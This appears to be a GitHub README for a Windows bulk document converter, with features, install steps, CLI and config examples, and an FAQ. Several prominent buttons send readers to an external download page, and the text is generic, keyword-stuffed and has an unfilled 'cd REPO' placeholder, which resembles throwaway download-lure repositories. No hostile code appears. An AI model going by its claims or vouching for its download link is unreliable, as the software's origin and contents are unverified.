# Batch Document Converter v1.18 - document converter 2026

> **Batch Document Converter is a Windows utility for converting documents in bulk, with batch-oriented workflows, drag-and-drop importing, and automation support in version 1.18.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.18-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jamesmason1989/batch-document-converter-v118?style=flat-square)](https://github.com/jamesmason1989/batch-document-converter-v118)

---

<p align="center">
  <a href="https://jamesmason1989.github.io/batch-document-converter-v118/">
    <img src="https://img.shields.io/badge/Download-Batch%20Document%20Converter%20Latest-brightgreen?style=for-the-badge" alt="Download Batch Document Converter">
  </a>
</p>

> **[Direct Download - Batch Document Converter v1.18](https://jamesmason1989.github.io/batch-document-converter-v118/)**

---

[Download Latest Build](https://jamesmason1989.github.io/batch-document-converter-v118/)

---

## Overview

Batch Document Converter is meant for converting documents in groups rather than handling each file individually. It is designed around Windows use cases and helps reduce repeated setup when you need to process many files in succession.

It handles PDF, DOCX, TXT, HTML, and Markdown, so it works well for office tasks, content production, and any workflow that moves text-focused files between formats. With folder-based processing, drag-and-drop support, and command-line control, it can be used interactively or as part of scripted automation.

---

## Features

- Batch conversion for multiple documents
- Supports PDF, DOCX, TXT, HTML, and Markdown
- Runs files in parallel to improve throughput
- Keeps layout, fonts, and images intact during conversion
- Accepts both files and folders via drag-and-drop
- Lets you set the destination folder and output format
- Offers command-line automation for repeatable operations
- Provides quiet mode for background execution

---

## Installation

1. Download the latest build from the project download page.
2. Extract the package if it is distributed as an archive.
3. Run the installer or launch the application from the provided folder.

For a local checkout, clone the repository and open the project files in your preferred environment:

    git clone https://github.com/jamesmason1989/batch-document-converter-v118.git
    cd REPO

Then start the app or launch the installed executable according to your setup.

---

## Usage

A typical workflow looks like this:

- Drag one or more documents into the window.
- Drop a full folder when you want to process a larger set at once.
- Pick the format you want the converted output to use.
- Select an output folder if you want the results saved elsewhere.
- Use the CLI when you need to repeat the same conversion steps later.

Example command-line workflow:

    batch-document-converter --input "C:\Docs" --output "C:\Converted" --format pdf

For unattended runs, enable quiet mode so the task can continue without extra prompts.

---

## Configuration

The usual settings focus on input selection, output destination, and format choice. In the desktop interface, these values are generally adjusted inside the app before each conversion.

Example configuration style:

    {
      "outputFolder": "C:\\Converted",
      "outputFormat": "PDF",
      "quietMode": true
    }

If you automate from the command line, keep your preferred parameters in a script or batch file for reuse.

---

## Requirements

- Windows platform support
- Windows 10 or Windows 11 x64 environment
- Sufficient disk space for source and converted files
- Access to the document types you want to process
- Optional: a command-line shell for automation workflows

---

## FAQ

**Does it support batch processing?**  
Yes. It is intended to convert multiple files in a single run.

**Which formats are available?**  
Supported formats include PDF, DOCX, TXT, HTML, and Markdown.

**Can I run it from the command line?**  
Yes. CLI automation is part of the workflow.

**Is drag-and-drop available?**  
Yes. Files or folders can be added by dragging them into the interface.

**Where do I change output settings?**  
Use the output folder and format options in the app or pass them through your script.

**What if I need background processing?**  
Quiet mode is available for unattended tasks.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
